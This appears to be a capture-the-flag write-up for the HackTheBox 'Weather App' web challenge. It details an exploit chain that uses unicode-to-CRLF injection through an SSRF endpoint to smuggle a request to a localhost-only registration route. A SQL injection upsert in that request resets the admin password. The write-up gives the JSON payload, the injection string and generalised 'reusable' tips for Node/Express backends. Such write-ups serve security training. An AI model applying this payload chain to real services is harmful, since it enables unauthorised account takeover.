# Weather App — SOLVED
- HTB 2023, makelaris. Date: 2026-09-11
- Flag: `HTB{REDACTED}` (POST /login {admin, passwd123})
- Artifacts: inline in this file; exploit script below.

## Structure (source in /home/kali/ctf/challenges/Weather App/web_weather_app/challenge/)
- `/register` POST: accepted only from `127.0.0.1` (`req.socket.remoteAddress`).
- `/api/weather` POST: `{endpoint,city,country}` -> SSRF through
  `http.HttpGet('http://${endpoint}/data/2.5/weather?q=${city},${country}&appid=...')`
  — special characters in `endpoint` are NOT encoded (Node's `http.get` maps
  certain unicode codepoints onto `%0A`/`%0D` when it parses the URL).
- `/login` POST: `{username, password}` -> when username is `admin`, the response
  carries the contents of `/app/flag`.
- `db.register` builds **raw SQL with no parameterisation**:
  `INSERT INTO users (username,password) VALUES ('${user}','${pass}')`

## Full chain (HTTP request smuggling through SSRF)
1. `endpoint` = `127.0.0.1` followed by `Ġ`/`č`/`Ċ`, which become
   space/CR/LF, so **a second HTTP request is injected** right behind the first:
   - Request #2 = `POST /register` with body username=`admin`, password=
     `') ON CONFLICT (username) DO UPDATE SET password='passwd123';--`
   - Content-Length is counted exactly: len(username) + len(password) + 19.
   - Request #3 = `GET␠`, which terminates request #2.
2. `/register` only accepts localhost, and the smuggled request originates from
   the Express backend calling `127.0.0.1` itself, so the check passes.
3. Once `/register` has run, POST /login with admin/passwd123 returns the flag.

## Payload (JS_FRIENDLY)
```
POST /api/weather
{"endpoint":"127.0.0.1/ĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ<NN>čĊčĊusername=admin&password=%27%29%20ON%20CONFLICT...already-encoded...čĊčĊGETĠ","city":"lol","country":"lol"}
```

## Reusable
- Unicode `Ġ`/`č`/`Ċ` inside a JSON body become space/CR/LF once a
  Node/Express backend parses the value into an internal URL.
- CRLF-injection request smuggling + SSRF = two very common primitives that
  compose.
- SQL injection: `') ON CONFLICT (<col>) DO UPDATE SET password='x';--` is the
  Postgres/SQLite upsert trick for changing a password without knowing the old one.
- When the backend fetch target is a loopback address such as `127.0.0.1` and the
  SSRF value is user-controlled, always try **HTTP request smuggling with CRLF
  first**.

## ID for challenges
- Recognition pair: `/api/weather` SSRF plus a localhost-only `/register`.
- The flag is read from `/app/flag` and returned by POST /login.
